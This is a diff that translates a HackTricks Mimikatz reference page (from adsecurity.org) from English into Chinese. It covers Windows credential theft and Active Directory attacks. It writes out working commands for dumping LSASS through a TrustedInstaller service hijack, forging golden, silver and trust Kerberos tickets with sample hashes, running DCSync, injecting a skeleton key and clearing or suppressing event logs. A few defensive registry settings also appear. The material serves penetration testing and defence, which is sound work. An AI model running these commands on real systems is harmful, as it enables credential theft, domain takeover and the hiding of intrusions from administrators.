@@ -4,350 +4,317 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
 
-The content of this page was copied [adsecurity.org](https://adsecurity.org/?page\_id=1821)
+本页内容来自[adsecurity.org](https://adsecurity.org/?page\_id=1821)
 
-## LM and Clear-Text in memory
+## 内存中的LM和明文密码
 
-Starting with Windows 8.1 and Windows Server 2012 R2, the LM hash and “clear-text” password are no longer in memory.
+从Windows 8.1和Windows Server 2012 R2开始，LM哈希和“明文”密码不再保存在内存中。
 
-In order to prevent the “clear-text” password from being placed in LSASS, the following registry key needs to be set to “0” (Digest Disabled):
+为了防止“明文”密码被放置在LSASS中，需要将以下注册表键设置为“0”（禁用Digest）：
 
 _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)_
 
-## **Mimikatz & LSA Protection:**
+## **Mimikatz和LSA保护：**
 
-Windows Server 2012 R2 and Windows 8.1 includes a new feature called LSA Protection which involves enabling [LSASS as a protected process on Windows Server 2012 R2](https://technet.microsoft.com/en-us/library/dn408187.aspx) (Mimikatz can bypass with a driver, but that should make some noise in the event logs):
+Windows Server 2012 R2和Windows 8.1包含一个名为LSA保护的新功能，它涉及在Windows Server 2012 R2上启用[LSASS作为受保护进程](https://technet.microsoft.com/en-us/library/dn408187.aspx)（Mimikatz可以通过驱动程序绕过，但这会在事件日志中产生一些噪音）：
 
-_The LSA, which includes the Local Security Authority Server Service (LSASS) process, validates users for local and remote sign-ins and enforces local security policies. The Windows 8.1 operating system provides additional protection for the LSA to prevent reading memory and code injection by non-protected processes. This provides added security for the credentials that the LSA stores and manages._
+_LSA包括本地安全性管理器服务器服务（LSASS）进程，用于验证本地和远程登录并执行本地安全策略。Windows 8.1操作系统为LSA提供了额外的保护，以防止非受保护进程读取内存和注入代码。这为LSA存储和管理的凭据提供了额外的安全性。_
 
-Enabling LSA protection:
+启用LSA保护：
 
-1. Open the Registry Editor (RegEdit.exe), and navigate to the registry key that is located at: HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa and Set the value of the registry key to: “RunAsPPL”=dword:00000001.
-2. Create a new GPO and browse to Computer Configuration, Preferences, Windows Settings. Right-click Registry, point to New, and then click Registry Item. The New Registry Properties dialog box appears. In the Hive list, click HKEY\_LOCAL\_MACHINE. In the Key Path list, browse to SYSTEM\CurrentControlSet\Control\Lsa. In the Value name box, type RunAsPPL. In the Value type box, click the REG\_DWORD. In the Value data box, type 00000001.Click OK.
+1. 打开注册表编辑器（RegEdit.exe），导航到位于以下位置的注册表键：HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa，并将注册表键的值设置为：“RunAsPPL”=dword:00000001。
+2. 创建一个新的GPO，浏览到计算机配置，首选项，Windows设置。右键单击注册表，指向新建，然后单击注册表项。出现新的注册表属性对话框。在Hive列表中，单击HKEY\_LOCAL\_MACHINE。在Key Path列表中，浏览到SYSTEM\CurrentControlSet\Control\Lsa。在Value name框中，键入RunAsPPL。在Value type框中，单击REG\_DWORD。在Value data框中，键入00000001。单击确定。
 
-LSA Protection prevents non-protected processes from interacting with LSASS. Mimikatz can still bypass this with a driver (“!+”).
+LSA保护防止非受保护进程与LSASS进行交互。Mimikatz仍然可以通过驱动程序（“!+”）绕过此保护。
 
 [![Mimikatz-Driver-Remove-LSASS-Protection](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)
 
-### Bypassing Disabled SeDebugPrivilege
-By default, SeDebugPrivilege is granted to the Administrators group through the Local Security Policy. In an Active Directory environment, [it is possible to remove this privilege](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5) by setting Computer Configuration --> Policies --> Windows Settings --> Security Settings --> Local Policies --> User Rights Assignment --> Debug programs defined as an empty group. Even in offline AD-connected devices, this setting cannot be overwritten and Local Administrators will receive an error when attempting to dump memory or use Mimikatz. 
+### 绕过已禁用的SeDebugPrivilege
+默认情况下，SeDebugPrivilege通过本地安全策略授予管理员组。在Active Directory环境中，[可以通过设置计算机配置 --> 策略 --> Windows设置 --> 安全设置 --> 本地策略 --> 用户权限分配 --> 调试程序定义为空组](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5)来删除此特权。即使在离线的AD连接设备上，也无法覆盖此设置，当本地管理员尝试转储内存或使用Mimikatz时，将收到错误提示。
 
-However, the TrustedInstaller account will still have access to dump memory and [can be used to bypass this defense](https://www.pepperclipp.com/other-articles/dump-lsass-when-debug-privilege-is-disabled). By modifying the config for the TrustedInstaller service, the account can be run to use ProcDump and dump the memory for `lsass.exe`. 
-
+然而，TrustedInstaller帐户仍然可以访问转储内存，并且[可以用于绕过此防御](https://www.pepperclipp.com/other-articles/dump-lsass-when-debug-privilege-is-disabled)。通过修改TrustedInstaller服务的配置，可以运行该帐户来使用ProcDump并转储`lsass.exe`的内存。
 ```
 sc config TrustedInstaller binPath= "C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"
 sc start TrustedInstaller
 ```
+![TrustedInstaller-Dump-Lsass](https://1860093151-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M6yZUYP7DLMbZuztKpV%2Fuploads%2FJtprjloNPADNSpb6S0DS%2Fimage.png?alt=media&token=9b639459-bd4c-4897-90af-8990125fa058)
 
-[![TrustedInstaller-Dump-Lsass](https://1860093151-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M6yZUYP7DLMbZuztKpV%2Fuploads%2FJtprjloNPADNSpb6S0DS%2Fimage.png?alt=media&token=9b639459-bd4c-4897-90af-8990125fa058)
-
-This dump file can be exfiltrated to an attacker-controlled computer where the credentials can be extracted. 
-
+这个转储文件可以被传输到一个受攻击者控制的计算机上，从中提取凭据。
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
+## 主要
 
-## Main
+### **事件**
 
-### **EVENT**
-
-**EVENT::Clear** – Clear an event log\
+**EVENT::Clear** – 清除事件日志\
 [\
 ![Mimikatz-Event-Clear](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)
 
-**EVENT:::Drop** – (_**experimental**_) Patch Events service to avoid new events
+**EVENT:::Drop** – (_**实验性**_) 修补事件服务以避免新事件
 
 [![Mimikatz-Event-Drop](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)
 
-Note:\
-Run privilege::debug then event::drop to patch the event log. Then run Event::Clear to clear the event log without any log cleared event (1102) being logged.
+注意:\
+运行 privilege::debug 然后运行 event::drop 来修补事件日志。然后运行 Event::Clear 来清除事件日志，而不会记录任何已清除的事件日志 (1102)。
 
 ### KERBEROS
 
-#### Golden Ticket
+#### 黄金票据
 
-A Golden Ticket is a TGT using the KRBTGT NTLM password hash to encrypt and sign.
+黄金票据是使用 KRBTGT NTLM 密码哈希进行加密和签名的 TGT。
 
-A Golden Ticket (GT) can be created to impersonate any user (real or imagined) in the domain as a member of any group in the domain (providing a virtually unlimited amount of rights) to any and every resource in the domain.
+可以创建黄金票据来冒充域中的任何用户（真实或虚构），作为域中任何组的成员（提供几乎无限的权限）访问域中的任何资源。
 
-**Mimikatz Golden Ticket Command Reference:**
+**Mimikatz 黄金票据命令参考:**
 
-The Mimikatz command to create a golden ticket is “kerberos::golden”
+创建黄金票据的 Mimikatz 命令是 "kerberos::golden"
 
-* /domain – the fully qualified domain name. In this example: “lab.adsecurity.org”.
-* /sid – the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.
-* /sids – Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain “S-1-5-21-1473643419-774954089-5872329127-519”. T[his parameter adds the provided SIDs to the SID History parameter.](https://adsecurity.org/?p=1640)
-* /user – username to impersonate
-* /groups (optional) – group RIDs the user is a member of (the first is the primary group).\
-  Add user or computer account RIDs to receive the same access.\
-  Default Groups: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).
-* /krbtgt – NTLM password hash for the domain KDC service account (KRBTGT). Used to encrypt and sign the TGT.
-* /ticket (optional) – provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.
-* /ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.
-* /id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID).
-* /startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
-* /endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (\~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).
-* /renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (\~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).
-* /sids (optional) – set to be the SID of the Enterprise Admins group in the AD forest (\[ADRootDomainSID]-519) to spoof Enterprise Admin rights throughout the AD forest (AD admin in every domain in the AD Forest).
-* /aes128 – the AES128 key
-* /aes256 – the AES256 key
+* /domain – 完全限定域名。例如: "lab.adsecurity.org"。
+* /sid – 域的 SID。例如: "S-1-5-21-1473643419-774954089-2222329127"。
+* /sids – 附加的 AD 森林中具有所需权限的帐户/组的 SID。通常，这将是根域的 Enterprise Admins 组 "S-1-5-21-1473643419-774954089-5872329127-519"。[此参数将提供的 SID 添加到 SID History 参数中。](https://adsecurity.org/?p=1640)
+* /user – 要冒充的用户名
+* /groups (可选) – 用户所属的组 RID（第一个是主要组）。\
+添加用户或计算机帐户的 RID 以获得相同的访问权限。\
+默认组: 513,512,520,518,519 用于众所周知的管理员组（如下所列）。
+* /krbtgt – 域 KDC 服务帐户（KRBTGT）的 NTLM 密码哈希。用于加密和签名 TGT。
+* /ticket (可选) – 提供保存黄金票据文件的路径和名称，以供以后使用，或使用 /ptt 立即将黄金票据注入内存供使用。
+* /ptt – 作为 /ticket 的替代方案 – 使用此选项立即将伪造的票据注入内存供使用。
+* /id (可选) – 用户 RID。Mimikatz 默认值为 500（默认管理员帐户 RID）。
+* /startoffset (可选) – 票据可用的开始偏移量（如果使用此选项，通常设置为 -10 或 0）。Mimikatz 默认值为 0。
+* /endin (可选) – 票据的生存期。Mimikatz 默认值为 10 年（约 5,262,480 分钟）。Active Directory 默认的 Kerberos 策略设置为 10 小时（600 分钟）。
+* /renewmax (可选) – 具有续订的最大票据生存期。Mimikatz 默认值为 10 年（约 5,262,480 分钟）。Active Directory 默认的 Kerberos 策略设置为 7 天（10,080 分钟）。
+* /sids (可选) – 设置为 AD 森林中 Enterprise Admins 组的 SID（\[ADRootDomainSID]-519），以在整个 AD 森林中冒充 Enterprise Admin 权限（在 AD 森林中的每个域中的 AD 管理员）。
+* /aes128 – AES128 密钥
+* /aes256 – AES256 密钥
 
-Golden Ticket Default Groups:
+黄金票据默认组:
 
-* Domain Users SID: S-1-5-21\<DOMAINID>-513
-* Domain Admins SID: S-1-5-21\<DOMAINID>-512
-* Schema Admins SID: S-1-5-21\<DOMAINID>-518
-* Enterprise Admins SID: S-1-5-21\<DOMAINID>-519 (this is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights)
-* Group Policy Creator Owners SID: S-1-5-21\<DOMAINID>-520
-
+* 域用户 SID: S-1-5-21\<DOMAINID>-513
+* 域管理员 SID: S-1-5-21\<DOMAINID>-512
+* 架构管理员 SID: S-1-5-21\<DOMAINID>-518
+* 企业管理员 SID: S-1-5-21\<DOMAINID>-519（仅在创建伪造票据时位于 Forest 根域中有效，但可以使用 /sids 参数添加以获取 AD 森林管理员权限）
+* 策略创建者所有者 SID: S-1-5-21\<DOMAINID>-520
 ```
 .\mimikatz "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
 ```
+[跨域的黄金票据](https://adsecurity.org/?p=1640)
 
-[Golden tickets across domains](https://adsecurity.org/?p=1640)
+#### 银票据
 
-#### Silver Ticket
+银票据是使用目标服务账户（通过SPN映射识别）的NTLM密码哈希进行加密和签名的TGS（与TGT格式类似）。
 
-A Silver Ticket is a TGS (similar to TGT in format) using the target service account’s (identified by SPN mapping) NTLM password hash to encrypt and sign.
+**创建银票据的示例Mimikatz命令：**
 
-**Example Mimikatz Command to Create a Silver Ticket:**
-
-The following Mimikatz command creates a Silver Ticket for the CIFS service on the server adsmswin2k8r2.lab.adsecurity.org. In order for this Silver Ticket to be successfully created, the AD computer account password hash for adsmswin2k8r2.lab.adsecurity.org needs to be discovered, either from an AD domain dump or by running Mimikatz on the local system as shown above (_Mimikatz “privilege::debug” “sekurlsa::logonpasswords” exit_). The NTLM password hash is used with the /rc4 paramteer. The service SPN type also needs to be identified in the /service parameter. Finally, the target computer’s fully-qualified domain name needs to be provided in the /target parameter. Don’t forget the domain SID in the /sid parameter.
-
+以下Mimikatz命令为adsmswin2k8r2.lab.adsecurity.org服务器上的CIFS服务创建了一个银票据。为了成功创建这个银票据，需要先发现adsmswin2k8r2.lab.adsecurity.org的AD计算机账户密码哈希，可以通过AD域转储或在本地系统上运行Mimikatz（如上所示：_Mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit_）来获取。NTLM密码哈希与/rc4参数一起使用。还需要在/service参数中识别服务SPN类型。最后，在/target参数中提供目标计算机的完全限定域名。不要忘记在/sid参数中提供域SID。
 ```
 mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
 ```
+#### [**信任票据**](https://adsecurity.org/?p=1588)
 
-#### [**Trust Ticket**](https://adsecurity.org/?p=1588)
+一旦确定了Active Directory信任密码哈希值，就可以生成信任票据。信任票据是使用两个相互信任的域之间共享的密码创建的。
+[有关信任票据的更多背景信息。](https://adsecurity.org/?p=1588)
 
-Once the Active Directory Trust password hash is determined, a trust ticket can be generated. The trust tickets are created using the shared password between 2 Domains that trust each other.\
-[More background on Trust Tickets.](https://adsecurity.org/?p=1588)
-
-**Dumping trust passwords (trust keys)**
-
+**转储信任密码（信任密钥）**
 ```
 Mimikatz “privilege::debug” “lsadump::trust /patch” exit
 ```
+**使用Mimikatz创建伪造的信任票据（跨域TGT）**
 
-**Create a forged trust ticket (inter-realm TGT) using Mimikatz**
-
-Forge the trust ticket which states the ticket holder is an Enterprise Admin in the AD Forest (leveraging SIDHistory, “sids”, across trusts in Mimikatz, my “contribution” to Mimikatz). This enables full administrative access from a child domain to the parent domain. Note that this account doesn’t have to exist anywhere as it is effectively a Golden Ticket across the trust.
-
+使用Mimikatz伪造信任票据，该票据声明持有者是AD Forest中的企业管理员（利用Mimikatz中的SIDHistory，“sids”在信任之间传递，这是我对Mimikatz的“贡献”）。这将使得从子域到父域具有完全的管理访问权限。请注意，此帐户实际上不需要存在于任何地方，因为它是跨域的Golden Ticket。
 ```
 Mimikatz “Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi” exit
 ```
+#### **更多KERBEROS**
 
-Trust Ticket Specific Required Parameters:
+**KERBEROS::List** - 列出用户内存中的所有用户票证（TGT和TGS）。不需要特殊权限，因为它只显示当前用户的票证。类似于“klist”的功能。
 
-* \*\*/\*\*target – the target domain’s FQDN.
-* \*\*/\*\*service – the kerberos service running in the target domain (krbtgt).
-* \*\*/\*\*rc4 – the NTLM hash for the service kerberos service account (krbtgt).
-* \*\*/\*\*ticket – provide a path and name for saving the forged ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.
+**KERBEROS::PTC** - 传递缓存（NT6）
+类似于Mac OS、Linux、BSD、Unix等*Nix系统会缓存Kerberos凭据。这些缓存数据可以通过Mimikatz进行复制和传递。也可用于在ccache文件中注入Kerberos票证。
 
-#### **More KERBEROS**
+Mimikatz的kerberos::ptc的一个很好的例子是在[利用PyKEK的MS14-068漏洞](https://adsecurity.org/?p=676)时。PyKEK生成一个ccache文件，可以使用kerberos::ptc将其注入到Mimikatz中。
 
-**KERBEROS::List** – List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.\
-Similar to functionality of “klist”.
+**KERBEROS::PTT** - 传递票证
+在找到[Kerberos票证](https://adsecurity.org/?p=1667)后，可以将其复制到另一台系统并传递到当前会话中，有效地模拟登录而无需与域控制器进行任何通信。不需要特殊权限。
+类似于SEKURLSA::PTH（Pass-The-Hash）。
 
-**KERBEROS::PTC** – pass the cache (NT6)\
-\*Nix systems like Mac OS, Linux,BSD, Unix, etc cache Kerberos credentials. This cached data can be copied off and passed using Mimikatz. Also useful for injecting Kerberos tickets in ccache files.
+* /filename - 票证的文件名（可以是多个）
+* /directory - 目录路径，其中的所有.kirbi文件将被注入。
 
-A good example of Mimikatz’s kerberos::ptc is when [exploiting MS14-068 with PyKEK](https://adsecurity.org/?p=676). PyKEK generates a ccache file which can be injected with Mimikatz using kerberos::ptc.
+**KERBEROS::Purge** - 清除所有Kerberos票证
+类似于“klist purge”的功能。在传递票证（PTC、PTT等）之前运行此命令，以确保使用正确的用户上下文。
 
-[![Mimikatz-PTC-PyKEK-ccacheFile](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg)
-
-**KERBEROS::PTT** – pass the ticket\
-After a [Kerberos ticket is found](https://adsecurity.org/?p=1667), it can be copied to another system and passed into the current session effectively simulating a logon without any communication with the Domain Controller. No special rights required.\
-Similar to SEKURLSA::PTH (Pass-The-Hash).
-
-* /filename – the ticket’s filename (can be multiple)
-* /diretory – a directory path, all .kirbi files inside will be injected.
-
-[![KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2](https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png)](https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png)
-
-**KERBEROS::Purge** – purge all Kerberos tickets\
-Similar to functionality of “klist purge”. Run this command before passing tickets (PTC, PTT, etc) to ensure the correct user context is used.
-
-[![Mimikatz-Kerberos-Purge](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png)
-
-**KERBEROS::TGT** – get current TGT for current user.
-
-[![Mimikatz-Kerberos-TGT](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png)
+**KERBEROS::TGT** - 获取当前用户的当前TGT。
 
 ### LSADUMP
 
-**LSADUMP**::**DCShadow** – Set the current machines as DC to have the habitability to create new objects inside the DC (persistent method).\
-This requires full AD admin rights or KRBTGT pw hash.\
-DCShadow temporarily sets the computer to be a “DC” for the purposes of replication:
+**LSADUMP**::**DCShadow** - 将当前计算机设置为DC，以便能够在DC内创建新对象（持久性方法）。
+这需要完整的AD管理员权限或KRBTGT密码哈希。
+DCShadow临时将计算机设置为“DC”，用于复制的目的：
 
-* Creates 2 objects in the AD forest Configuration partition.
-* Updates the SPN of the computer used to include “GC” (Global Catalog) and “E3514235-4B06-11D1-AB04-00C04FC2DCD2” (AD Replication). More info on Kerberos Service Principal Names in the [ADSecurity SPN section](https://adsecurity.org/?page\_id=183).
-* Pushes the updates to DCs via DrsReplicaAdd and KCC.
-* Removes the created objects from the Configuration partition.
+* 在AD林配置分区中创建2个对象。
+* 更新所使用计算机的SPN，包括“GC”（全局目录）和“E3514235-4B06-11D1-AB04-00C04FC2DCD2”（AD复制）。有关Kerberos服务主体名称的更多信息，请参见[ADSecurity SPN部分](https://adsecurity.org/?page\_id=183)。
+* 通过DrsReplicaAdd和KCC将更新推送到DC。
+* 从配置分区中删除创建的对象。
 
-**LSADUMP::DCSync** – ask a DC to synchronize an object (get password data for account)\
-[Requires membership in Domain Administrator, domain Administrators, or custom delegation.](https://adsecurity.org/?p=1729)
+**LSADUMP::DCSync** - 请求DC同步对象（获取帐户的密码数据）
+[需要域管理员、域管理员或自定义委派的成员资格。](https://adsecurity.org/?p=1729)
 
-A major feature added to Mimkatz in August 2015 is “DCSync” which effectively “impersonates” a Domain Controller and requests account password data from the targeted Domain Controller.
+Mimikatz在2015年8月添加的一个重要功能是“DCSync”，它有效地“冒充”域控制器，并从目标域控制器请求帐户密码数据。
 
-**DCSync Options:**
+**DCSync选项：**
 
-* /all – DCSync pull data for the entire domain.
-* /user – user id or SID of the user you want to pull the data for.
-* /domain (optional) – FQDN of the Active Directory domain. Mimikatz will discover a DC in the domain to connect to. If this parameter is not provided, Mimikatz defaults to the current domain.
-* /csv – export to csv
-* /dc (optional) – Specify the Domain Controller you want DCSync to connect to and gather data.
+* /all - DCSync获取整个域的数据。
+* /user - 要获取数据的用户的用户ID或SID。
+* /domain（可选） - Active Directory域的FQDN。Mimikatz将发现一个要连接的域中的DC。如果未提供此参数，Mimikatz将默认为当前域。
+* /csv - 导出为csv
+* /dc（可选） - 指定要DCSync连接并收集数据的域控制器。
 
-There’s also a /guid parameter.
+还有一个/guid参数。
 
-**DCSync Command Examples:**
+**DCSync命令示例：**
 
-Pull password data for the KRBTGT user account in the rd.adsecurity.org domain:\
-_Mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt” exit_
+获取rd.adsecurity.org域中KRBTGT用户帐户的密码数据：
+_Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt" exit_
 
-Pull password data for the Administrator user account in the rd.adsecurity.org domain:\
-_Mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator” exit_
+获取rd.adsecurity.org域中Administrator用户帐户的密码数据：
+_Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator" exit_
 
-Pull password data for the ADSDC03 Domain Controller computer account in the lab.adsecurity.org domain:\
-_Mimikatz “lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$” exit_
+获取lab.adsecurity.org域中ADSDC03域控制器计算机帐户的密码数据：
+_Mimikatz "lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$" exit_
 
-**LSADUMP::LSA** – Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use /patch for a subset of data, use /inject for everything. _Requires System or Debug rights._
+**LSADUMP::LSA** - 请求LSA服务器检索SAM/AD企业（正常、即时修补或注入）数据。使用/patch获取部分数据，使用/inject获取全部数据。_需要系统或调试权限。_
 
-* /inject – Inject LSASS to extract credentials
-* /name – account name for target user account
-* /id – RID for target user account
-* /patch – patch LSASS.
+* /inject - 注入LSASS以提取凭据
+* /name - 目标用户帐户的帐户名
+* /id - 目标用户帐户的RID
+* /patch - 修补LSASS。
 
-Often service accounts are members of Domain Admins (or equivalent) or a Domain Admin was recently logged on to the computer an attacker dump credentials from. Using these credentials, an attacker can gain access to a Domain Controller and get all domain credentials, including the KRBTGT account NTLM hash which is used to create Kerberos Golden Tickets.
-
+通常，服务帐户是域管理员（或等效）的成员，或者最近有一个域管理员登录到计算机上，攻击者可以从中转储凭据。使用这些凭据，攻击者可以访问域控制器并获取所有域凭据，包括用于创建Kerberos Golden Tickets的KRBTGT帐户NTLM哈希。
 ```
 mimikatz lsadump::lsa /inject exit
 ```
-
 **LSADUMP::NetSync**
 
-NetSync provides a simple way to use a DC computer account password data to impersonate a Domain Controller via a Silver Ticket and DCSync the target account’s information including the password data\_.\_
+NetSync提供了一种简单的方法，使用DC计算机帐户密码数据来冒充域控制器，通过Silver Ticket并DCSync目标帐户的信息，包括密码数据。
 
-**LSADUMP::SAM** – get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts.
+**LSADUMP::SAM** - 获取SysKey以解密SAM条目（来自注册表或hive）。SAM选项连接到本地安全帐户管理器（SAM）数据库，并转储本地帐户的凭据。
 
-**LSADUMP::Secrets** – get the SysKey to decrypt SECRETS entries (from registry or hives).
+**LSADUMP::Secrets** - 获取SysKey以解密SECRETS条目（来自注册表或hive）。
 
-**LSADUMP::SetNTLM** – Ask a server to set a new password/ntlm for one user.
+**LSADUMP::SetNTLM** - 请求服务器为一个用户设置新的密码/ntlm。
 
-[**LSADUMP::Trust**](https://adsecurity.org/?p=1588) – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).
+[**LSADUMP::Trust**](https://adsecurity.org/?p=1588) - 请求LSA服务器检索信任认证信息（正常或即时修补）。
 
 ### MISC
 
-[**MISC::Skeleton**](https://adsecurity.org/?p=1275) – Inject Skeleton Key into LSASS process on Domain Controller.
-
+[**MISC::Skeleton**](https://adsecurity.org/?p=1275) - 将骨架密钥注入到域控制器上的LSASS进程中。
 ```
 "privilege::debug" "misc::skeleton"
 ```
-
 ### PRIVILEGE
 
-**PRIVILEGE::Backup** – get backup privilege/rights. Requires Debug rights.
+**PRIVILEGE::Backup** – 获取备份特权/权限。需要调试权限。
 
-**PRIVILEGE::Debug** – get debug rights (this or Local System rights is required for many Mimikatz commands).
+**PRIVILEGE::Debug** – 获取调试权限（许多Mimikatz命令需要此权限或本地系统权限）。
 
 ### SEKURLSA
 
-**SEKURLSA::Credman** – List Credentials Manager
+**SEKURLSA::Credman** – 列出凭据管理器
 
-**SEKURLSA::Ekeys** – List **Kerberos encryption keys**
+**SEKURLSA::Ekeys** – 列出Kerberos加密密钥
 
-**SEKURLSA::Kerberos** – List Kerberos credentials for all authenticated users (including services and computer account)
+**SEKURLSA::Kerberos** – 列出所有已认证用户（包括服务和计算机账户）的Kerberos凭据
 
-**SEKURLSA::Krbtgt** – get Domain Kerberos service account (KRBTGT)password data
+**SEKURLSA::Krbtgt** – 获取域Kerberos服务账户（KRBTGT）的密码数据
 
-**SEKURLSA::SSP** – Lists SSP credentials
+**SEKURLSA::SSP** – 列出SSP凭据
 
-**SEKURLSA::Wdigest** – List WDigest credentials
+**SEKURLSA::Wdigest** – 列出WDigest凭据
 
-**SEKURLSA::LogonPasswords** – lists all available provider credentials. This usually shows recently logged on user and computer credentials.
+**SEKURLSA::LogonPasswords** – 列出所有可用的提供者凭据。通常显示最近登录的用户和计算机凭据。
 
-* Dumps password data in LSASS for currently logged on (or recently logged on) accounts as well as services running under the context of user credentials.
